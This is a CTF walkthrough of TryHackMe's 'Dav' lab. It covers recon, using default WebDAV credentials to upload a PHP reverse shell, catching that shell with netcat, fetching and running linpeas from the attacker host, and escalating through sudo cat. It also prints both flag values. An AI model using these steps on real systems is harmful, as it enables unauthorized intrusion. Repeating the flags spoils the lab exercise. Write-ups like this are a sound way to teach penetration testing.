# Dav
Read user.txt and root.txt

Initial nmap scan:
```
jeffrowell@kali:~/Documents/TryHackMe/Dav$ nmap -sC -sV -Pn -n $IP -oN nmap/initial.txt
# Nmap 7.80 scan initiated Thu May 14 22:36:06 2020 as: nmap -sC -sV -Pn -n -oN nmap/initial.txt 10.10.128.12
Nmap scan report for 10.10.128.12
Host is up (0.15s latency).
Not shown: 999 closed ports
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu May 14 22:36:26 2020 -- 1 IP address (1 host up) scanned in 20.17 seconds
```

Port 80 is open, inital `gobuster` recon:
```
jeffrowell@kali:~/Documents/TryHackMe/Dav$ gobuster dir -u http://$IP -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.128.12
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/05/14 23:13:59 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/server-status (Status: 403)
/webdav (Status: 401)
===============================================================
2020/05/14 23:15:02 Finished
===============================================================
```

The `/webdav` endpoint is un-authorized, but we can easily find apache webdav default credentials online: `wampp:xampp`. Once we authenticate, the page returns a directory listing:


![webdav](https://user-images.githubusercontent.com/32188816/82014258-79dc3b80-9639-11ea-854a-883b6f62660a.png)

Since we are getting a directory listing with what appears to be default credentials, we can try to upload a PHP reverse shell. To do this, I like to use pentestmonkey's PHP reverse shell. Uploading the file we see it worked:

```
jeffrowell@kali:~/Documents/TryHackMe/Dav$ curl -u wampp:xampp --upload-file revshell.php http://$IP/webdav/
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>201 Created</title>
</head><body>
<h1>Created</h1>
<p>Resource /webdav/revshell.php has been created.</p>
<hr />
<address>Apache/2.4.18 (Ubuntu) Server at 10.10.128.12 Port 80</address>
</body></html>
```

Now we can see the file in the directory listing:

![Screenshot_2020-05-14_23-31-34](https://user-images.githubusercontent.com/32188816/82015011-063b2e00-963b-11ea-8a59-e1c47419822a.png)

Before we execute the file, lets set up a listener:
```
nc -lvp 9999
```

After loading the file in the browser we get the connection back:
```
jeffrowell@kali:~/Documents/TryHackMe/Dav$ nc -lvp 9999
listening on [any] 9999 ...
10.10.128.12: inverse host lookup failed: Unknown host
connect to [10.8.21.42] from (UNKNOWN) [10.10.128.12] 55106
Linux ubuntu 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 22:32:42 up 58 min,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=33(www-data) gid=33(www-data) groups=33(www-data)
/bin/sh: 0: can't access tty; job control turned off
$ id  
uid=33(www-data) gid=33(www-data) groups=33(www-data)

```

# Task 1
1. user.txt
Once we are on the box through the reverse shell, we can see that there are two users, and there is a user flag in the `/home/merlin` directory:
```
$ pwd
/
$ ls /home    	
merlin
wampp
$ cd /home/merlin
$ ls
user.txt
$ cat user.txt
449b40fe93f78a938523b7e4dcd66d2a
$
```

2. root.txt
In the shell, we can download `linpeas` from our local machine. Move to a directory or copy `linpeas` to the current directory then run Python's `SimpleHTTPServer` to serve the file.
Client:
```
python3 -m http.server 8888
```
Reverse Shell:
```
cd /tmp
wget http:10.8.21.42:8888/linpeas.sh
chmod +x linpeas.sh
./linpeas.sh
```
After running `linpeas` we see that the www-data user can run the cat command as root:
![Screenshot_2020-05-15_00-01-29](https://user-images.githubusercontent.com/32188816/82016909-308eea80-963f-11ea-96bb-452bf9da4de0.png)
Since we know that we can run `cat` as root, we can simply just cat out `root/root.txt` to get the flag:
```1
www-data@ubuntu:/tmp$ sudo cat /root/root.txt
sudo cat /root/root.txt
101101ddc16b0cdf65ba0b8a7af7afa5
```
